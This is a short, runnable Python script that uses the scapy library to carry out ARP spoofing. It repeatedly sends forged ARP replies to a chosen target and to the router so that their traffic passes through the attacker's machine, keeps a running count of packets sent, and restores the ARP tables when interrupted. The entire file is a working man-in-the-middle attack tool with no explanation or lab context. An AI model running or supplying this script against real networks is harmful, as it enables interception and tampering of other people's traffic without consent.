#!/usr/bin/env python

import scapy.all as scapy
import time
import optparse

def restore(dest_ip, router_ip):
    dest_ip_mac=get_mac(dest_ip)
    router_ip_mac=get_mac(router_ip)
    rpack=scapy.ARP(op=2, pdst=dest_ip, psrc=router_ip, hwdst=dest_ip_mac, hwsrc=router_ip_mac)
    return (scapy.send(rpack, count=6, verbose=False))


def get_mac(ip):
    arp_request=scapy.ARP(pdst=ip)
    arp_broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet=arp_broadcast/arp_request
    mac_response=scapy.srp(arp_packet, timeout=1, verbose=False)[0]
    return (mac_response[0][1].hwsrc)

def spoof(targetip,spoofip):
    mac=get_mac(targetip)
    packet = scapy.ARP(op=2, pdst=targetip, psrc=spoofip, hwdst=mac)
    scapy.send(packet, verbose=False)

def get_args():
    parser=optparse.OptionParser()
    parser.add_option("-t","--target",dest="targetip",help="Enter the target IP")
    parser.add_option("-r","--roter",dest="routerip",help="Enter the Router IP")
    (options, argument)=parser.parse_args()
    if not options.targetip:
        parser.error("[-] Please Enter Target IP, use --help for info")
    if not options.routerip:
        parser.error("[-] Please enter Router IP, use --help for info")
    return options

ips=get_args()
target_ip=ips.targetip
gateway_ip=ips.routerip

try:
    count = 0
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        count=count+2
        print("\r[+] Packets sent: "+str(count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] DETECTED CTRL + C, Restoring ARP tables....")
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)
    print("[-] QUITING")

